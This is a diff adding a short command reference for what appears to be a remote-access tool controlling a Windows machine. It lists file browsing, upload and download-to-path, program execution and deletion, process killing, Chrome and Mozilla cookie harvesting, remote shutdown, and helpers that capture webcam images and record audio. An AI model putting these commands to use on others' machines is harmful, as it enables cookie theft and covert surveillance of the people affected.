@@ -1,0 +1,38 @@
+
+Commands List
+*************
+
+drives
+minimize
+screen
+
+browse ## C:
+browse ## C:\Data | mp3
+browseall ## C:\Data
+
+execute ## D:\a.exe | parameters
+execute1 ## D:\a.exe | parameters
+delete ## D:\a.exe
+
+upload ## D:\a.exe
+uploaddir ## D:\Folder
+download ## http://www.example.com/test.exe | D:\a.exe
+
+processes
+killprocess ## chrome.exe
+
+cookies ## chrome
+cookies ## mozilla
+
+cmd ## shutdown
+msg ## Title | Hello
+
+
+
+---------------------------------------------------------------------------
+
+Third Party Files:
+******************
+
+cam.exe /filename "D:\image.bmp"
+record.exe 60 "D:\record.wav"
